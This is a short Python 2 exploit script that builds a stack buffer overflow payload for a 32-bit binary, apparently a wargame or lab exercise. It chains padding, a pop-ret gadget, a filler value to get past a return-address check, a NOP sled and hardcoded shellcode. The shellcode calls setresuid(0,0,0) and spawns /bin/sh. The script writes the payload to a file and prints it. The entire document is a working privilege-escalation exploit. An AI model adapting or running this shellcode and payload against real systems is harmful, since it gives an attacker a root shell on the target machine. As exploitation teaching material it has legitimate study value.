#!/usr/bin/python
import struct 

def conv(hexAddr):
    return struct.pack("<I",hexAddr) # Returns packed binary data to calling()

def saveFile(filename,data):
    with open(filename,'w') as f:
        f.write(data)                # Writes data to file

offset = 80         # Space between start of buffer till right before eip
junk = "A" * offset # Fill the space above with A's
control_eip = conv(0xbffff7e0) # Middle of the nop sled
nop_sled = "\x90" * 64         # To account for differences in stack address
prepend = conv(0xcafebabe)     # To skip checking of return address
pop_ret = conv(0x08048453)     # Pops off 0xcafebabe and return to address containing shellcode

# setresuid(0,0,0) && execve('/bin/sh',{"//bin/sh", NULL},NULL) && exit(0)
shellcode = "\xb0\xa4\x31\xdb\x31\xc9\x31\xd2\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\x40\xcd\x80"

# Final payload
payload = junk + pop_ret + prepend + control_eip + nop_sled + shellcode

# For debugging purposes, GDB
filename = 'exploit.txt'   
saveFile(filename,payload)

print payload   # Prints payload to STDOUT
